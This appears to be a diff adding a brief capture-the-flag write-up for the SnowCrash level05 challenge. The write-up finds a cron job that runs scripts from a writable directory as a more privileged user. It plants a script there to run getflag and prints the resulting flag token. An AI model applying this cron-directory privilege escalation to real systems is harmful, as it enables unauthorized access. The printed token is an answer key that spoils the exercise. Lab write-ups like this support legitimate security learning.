@@ -1,0 +1,26 @@
+level05@localhost's password: 
+You have new mail.
+
+this message "You have new mail." means there;s a main waiting for the user level05
+
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+cron job is running automatically on the system 
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+level05@SnowCrash:~$ vim /opt/openarenaserver/script.sh
+level05@SnowCrash:~$ chmod +x /opt/openarenaserver/script.sh
+level05@SnowCrash:~$ cat /opt/openarenaserver/script.sh 
+/bin/getflag > /tmp/flag05
+
+level05@SnowCrash:~$ cat /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
